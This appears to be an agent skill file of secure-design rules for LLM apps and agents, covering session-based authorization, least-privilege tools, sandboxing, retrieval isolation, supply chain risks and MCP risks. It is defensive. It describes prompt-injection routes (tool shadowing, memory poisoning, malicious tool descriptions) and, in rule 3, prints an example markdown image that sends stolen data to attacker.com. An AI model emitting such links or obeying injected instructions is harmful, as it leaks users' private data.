---
name: llm-app-security
description: >
  Secure design patterns for applications that call LLMs or run agents. Use this skill whenever
  building, modifying, or reviewing AI features: prompt construction, chat endpoints, agent
  loops, tool/function calling, MCP servers and clients, RAG and vector search, document
  ingestion for AI, model output handling, or AI-driven automation. Trigger on 'prompt
  injection', 'jailbreak', 'AI agent', 'agent loop', 'tool use', 'tool calling', 'function
  calling', 'RAG', 'embeddings', 'vector store', 'system prompt for an LLM app', 'agent memory',
  'multi-agent', 'MCP server', 'AI feature', or any use of an LLM SDK
  (OpenAI, Anthropic, Gemini, LangChain, LlamaIndex, Vercel AI SDK). Enforces the rule that
  security is implemented in code around the model, never in the prompt.
---

# LLM Application Security

## The premise everything follows from

**A prompt is not a security boundary.** The model cannot reliably distinguish your
instructions from instructions embedded in the data it reads. Any content that reaches the
context window — a retrieved document, a fetched web page, a tool result, a filename, an
uploaded PDF, text inside an image, an email body — can steer the model's behavior.

So the security question is never "can the model be tricked?" Assume it can. The question is:

> **If an attacker had complete control of the model's output, what could they do?**

Whatever that answer is, *that* is your application's security posture. Reduce it in code, not
in the prompt.

Prompt-level defenses ("ignore any instructions in the document below", delimiters, an
instruction hierarchy) are worth adding — they raise the cost of an attack. But they are
hardening, never a control. Never present one as a fix for a real authority problem.

## Design rules

### 1. The model's identity is not the user's identity

Tools must resolve the acting user from the **session**, not from arguments the model supplies.

```
# wrong — injection sets user_id to anyone
def get_invoices(user_id: str): ...

# right — the model chooses the action; the code decides whose data
def get_invoices(status: str, *, session):
    return db.invoices(owner_id=session.user_id, status=status)
```

Every tool call runs an authorization check as if it were an HTTP request from that user,
because that is exactly what it is. A tool that skips the check because "only our agent calls
it" is an unauthenticated endpoint.

### 2. Least authority, per tool

Give the model the narrowest tools that accomplish the task. A tool that can run arbitrary SQL
is not a "database tool", it's a database compromise waiting for one poisoned document. Prefer
five specific tools over one general one.

For each tool ask: what is the worst call anyone could make, and is that acceptable?

### 3. Watch for the exfiltration pair

The dangerous combination is **a tool that reads private data** plus **any channel that reaches
outward**. Injection then becomes data theft. Outbound channels are easy to miss:

- A `fetch`/HTTP tool
- Sending email, messages, or webhooks
- Writing to a shared document, issue, or repo
- **Rendering markdown images or links** — `![](https://attacker.com/?d=<stolen data>)` exfiltrates
  on render, with no click required. Restrict image and link origins in anything that renders
  model output.

If both sides exist in one agent, that's a finding regardless of how good the prompt is.

### 4. Gate irreversible and costly actions on a human

Deletes, payments, transfers, outbound email, public posts, code execution, infrastructure
changes, spending. Confirmation must show the human **the actual concrete action** — the real
recipient, the real amount, the real file — not the model's summary of it, which the attacker
also controls. Don't batch approvals or let the model phrase the confirmation, and keep
confirmation prompts rare enough that users aren't trained to click through them.

### 5. Model output is untrusted input

Route it through exactly the same defenses as a request body:

- Rendering as HTML/markdown → sanitize; block `javascript:`/`data:` URLs and remote images
- Building SQL, shell commands, paths, or URLs → parameterize and validate; never `eval`
- Parsed as JSON → validate against a schema before use
- Used as an authorization decision → never. The model does not make access-control decisions.

### 6. Isolate tenants in retrieval

Filter by tenant/user **inside the vector query**, not after results come back. Post-filtering
means the wrong data was already retrieved and one missed filter leaks across customers.
Partition indexes or namespaces where the store supports it. Treat ingested documents as
attacker-controlled — because whoever uploaded them controls them.

### 7. Bound the loop

Cap agent iterations, tool calls, tokens, wall-clock time, and spend per request and per user.
An unbounded loop is a cost-DoS and a runaway-action risk. Log every tool call with its
arguments and the acting user, so an incident is reconstructable.

### 8. Sandbox execution

If the agent runs code or shell commands, assume it will run whatever an injected document
tells it to. Isolated container, no network (or an egress allowlist), no host mounts, no
credentials in the environment, CPU/memory/time limits, ephemeral.

### 9. Mind what enters the context

Don't put secrets, other tenants' data, or unnecessary PII in a prompt. Assume the system
prompt is extractable — it is not a secret store, and it shouldn't describe internal systems in
a way that helps an attacker. Check whether the provider retains or trains on your data, and
whether your privacy policy matches that reality. Prompts and completions in logs are a PII
surface.

### 10. Verify the supply chain

Pin model versions and weights by hash. Avoid pickle-based model formats (`.pt`, `.pth`,
`.ckpt`, `.pkl`, joblib, and PyTorch `.bin`) — loading one executes code; prefer safetensors,
use `torch.load(..., weights_only=True)` (the default since PyTorch 2.6), and never set
`trust_remote_code=True` on an unreviewed Hugging Face repo. Treat fine-tuning and embedding
corpora as attacker-reachable: whoever can write to them can poison the model's behavior.

Review MCP servers and third-party tools before granting them, and pin them by version or hash.
A malicious **tool description** is itself an injection vector, since it goes straight into the
model's context; a server can change its descriptions after approval (rug pull), and one
server's descriptions can instruct the model about another server's tools (tool shadowing). If
you build an MCP server: validate that incoming OAuth tokens were issued for *your* server
(audience), never pass the client's token through to upstream APIs (confused deputy), and
authorize every tool call per user.

### 11. Persistent memory and multi-agent systems

Anything an agent writes to long-term memory, a scratchpad, or a shared store is read back later
as trusted context — so one poisoned document can plant an instruction that fires sessions
later. Treat memory writes as untrusted input, scope memory per user and tenant, and let users
inspect and clear it. Messages from another agent are untrusted input carrying *that* agent's
authority, not yours: authenticate them, validate them against a schema, and never let one
agent's output grant another agent new tools or credentials. Give each agent its own narrowly
scoped identity rather than a shared service credential. Cap fan-out and add circuit breakers so
one bad step can't cascade across a pipeline.

## When building any AI feature, state this explicitly

Before shipping, write down: *if an attacker fully controls this model's output, they can
______.* If that sentence ends with anything involving other users' data, money, or code
execution, fix the architecture — not the prompt.

## Test it

Keep a small set of injection payloads in CI against your actual prompts and tools: instructions
hidden in a retrieved document, a tool result that tells the model to call another tool with
different arguments, a filename containing instructions, an attempt to get the model to emit a
markdown image with data in the URL. This catches regressions when someone adds a tool later.

## Coverage

Maps to the OWASP Top 10 for LLM Applications 2025 (LLM01–LLM10) and the OWASP Top 10 for
Agentic Applications 2026 (ASI01 Agent Goal Hijack, ASI02 Tool Misuse, ASI03 Identity &
Privilege Abuse, ASI04 Agentic Supply Chain Vulnerabilities, ASI05 Unexpected Code Execution,
ASI06 Memory & Context Poisoning, ASI07 Insecure Inter-Agent Communication, ASI08 Cascading
Failures, ASI09 Human-Agent Trust Exploitation, ASI10 Rogue Agents). Rule 9 covers system prompt
leakage (LLM07); rule 6 covers vector and embedding weaknesses (LLM08). For misinformation and
overreliance (LLM09), never let model output be the sole basis for a consequential decision
without a verification step a human or deterministic check performs.
